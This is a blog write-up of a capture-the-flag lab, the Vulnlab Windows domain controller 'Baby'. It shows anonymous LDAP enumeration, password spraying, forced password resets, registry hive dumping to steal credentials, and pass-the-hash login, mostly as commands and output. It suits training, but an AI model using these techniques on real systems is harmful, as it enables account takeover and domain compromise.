--- 
title: "Baby(VL) Writeup" 
date: 2023-07-11 00:00 +0000 
categories: [Vunlab, EJPT]
tags: [CTFs, Vunlab, personal blog, WriteUP,ctf, Sync.VL, Vunlab, ejpt-like] 
author: Fabb05 
image:
  path: https://raw.githubusercontent.com/FabV05/files/main/Baby(VL)/spaces_I3I73FFqB6GvT8N5Mt1N_uploads_PAoGV9AEbnSdglj00d01_baby_slide.png
  alt: img of the machine
---




##  Baby (VunLab)

## Machine information

| Caracteristica |  Baby   |     |
|:--------------:|:-------:| --- |
|       TTL       | 127 |     |
|  Difficulty:   |  Easy   |     |
|      issue       |  Missconfiguration       |     |
|      From      | Vunlab  |     |
| IP               |      10.10.64.243   |     |


## Inforeation Recon

### Nmap Summary

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-23T22:16:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2023-07-22T22:07:41
|_Not valid after:  2024-01-21T22:07:41
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-07-23T22:15:47+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
64158/tcp open  msrpc         Microsoft Windows RPC
64172/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-23T22:15:48
|_  start_date: N/A
```


#### Nmap Tcp Scan command

```bash
nmap -p- --open --min-rate 5000 -Pn -n -vvv 10.10.64.2432 -oG AllPorts
```


### Port Analysis 

#### Port  3268-  Ldap

What is Ldap? LDAP (Lightweight Directory Access Protocol) is a network protocol used to access and manage directory information. It provides a hierarchical structure to store and organize data, such as user accounts, passwords, and network resources. LDAP is commonly used for centralized authentication, allowing users to log in once and access various services securely. It simplifies the management of user information across multiple systems, making it ideal for large-scale networks. LDAP servers store data in a tree-like structure, with each node representing an entry containing attributes like names, addresses, and permissions. Its lightweight design and efficiency make it a popular choice for directory services in modern IT infrastructures.

This service contains important information that can grant access to the system. However, to access it, credentials are required. Currently, we don't have the credentials, so we can attempt to access it anonymously using the following command:

```bash
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://10.10.64.243

description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
--
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
--
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
--
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby
--
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
--
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby
--
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
--
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
instanceType: 4
--
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
--
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
```

It seems that we can obtain information anonymously, and the most interesting part is the last line, which gives us the credentials of a user named 'teresa.bell' and her password 'BabyStart123!'. So we can try to access the smb or ldap with these credentials.

```bash
crackmapexec  ldap 10.10.64.2432 -u 'teresa.bell' -p 'BabyStart123!'

SMB  10.10.64.243 445  BABYDC  [-] baby.vl\Teresa Bell:BabyStart123! Error connecting to 
```

However, those don't seem to be the correct credentials for that account, but we can confirm that this password is indeed associated with an account. So our next plan is to create a txt file with the usernames and try them one by one. I created the following file:

```bash
Administrator
Guest
krbtgt
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsAdmins
DnsUpdateProxy
dev
jacqueline.barnett
ashley.webb
hugh.george
leonard.dyer
connor.wilkinson
joseph.hughes
kerry.wilson
teresa.bell
caroline.robinson
ian.walker
```
Now, using crackmapexec, we will try to log in with the users from the list using the password 'BabyStart123!':

```bash
crackmapexec smb 10.10.64.243 -u users.txt -p 'BabyStart123!' 
SMB         10.10.64.243   445    BABYDC           [-]
baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

NICE! We found the user associated with the password. However, there's something curious... That STATUS_PASSWORD_MUST_CHANGE means that the account needs to change the password; this usually happens when you are given a temporary password.

## Explotation

To take advantage of this, we can use the 'smbpasswd' tool to change the password to something of our choosing.

```bash
smbpasswd -U BABY/caroline.robinson -r 10.10.104.152
Old SMB password:BabyStart123!
New SMB password:Star@123!
Retype new SMB password:Star@123!
```

Now, we just need to log in to the machine using evil-winrm:

```bash
evil-winrm -i 10.10.64.243 -u 'caroline.robinson' -p 'Star@123!'
```

And... OH NO!! AN ERROR!!!

![alt text](https://raw.githubusercontent.com/FabV05/files/main/Baby(VL)/Pasted%20image%2020230723214703.png)

After investigating, I discovered that AD has a script that resets everything every x minutes. So, we need to create a script that changes the password constantly. I created the following one-liner based on one from https://secure77.de/. Now, the main problem with this script is that you have to keep changing the new password manually, so I recommend changing just one letter to a special character.

```bash
`export current_password='BabyStart123!'; export new_password='Start124!'; (echo "$current_password"; echo "$new_password"; echo "$new_password") | smbpasswd -s -U caroline.robinson -r 10.10.64.243 && evil-winrm -i 10.10.64.243 -u caroline.robinson -p "$new_password"`
```
By using this, we can log into the machine, and we found the first flag VL{b2c61************}.

## Privilage Escalation

Now that we are a user, we need to find a way to become a privileged user. To do this, we need to follow these steps:

```bash
whoami /all 

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```
The important part here is that we are part of the groups SeBackupPrivilege and SeRestorePrivilege. Following the steps in this article https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/, we can perform the following commands:

```bash
Part 1
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system

Part 2

cd Temp
download sam
download system

Part 3

pypykatz registry --sam sam system

...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43::
```

Now, we have the NTLM Hash, which allows us to log in. We can do it as follows:

```bash
evil-winrm -i 10.10.64.243 -u 'Administrator' -H '8d992faed38128ae85e95fa35868bb43'
```

With this, we can find the root flag VL{b8512958}.

## Conclution 

In conclusion, "Baby" on the VunLab environment holds significant offensive value. This machine offers an excellent opportunity to enhance skills in reconnaissance, enumeration, and exploitation in Windows environments, particularly in the context of Active Directory.

It is crucial to emphasize the importance of adhering to secure practices while configuring services, such as avoiding anonymous access when unnecessary, using strong passwords, and ensuring that users do not possess unnecessary privileges. The configuration vulnerability that allowed anonymous access to the LDAP service proved to be a critical point for gathering information and advancing in privilege escalation.

Furthermore, the technique of constantly changing passwords and utilizing tools like `pypykatz` to extract NTLM passwords are compelling strategies to maintain access and acquire privileged credentials.

Overall, "Baby" delivers a valuable learning experience to improve offensive security skills and underscores the significance of implementing sound security practices to safeguard enterprise environments.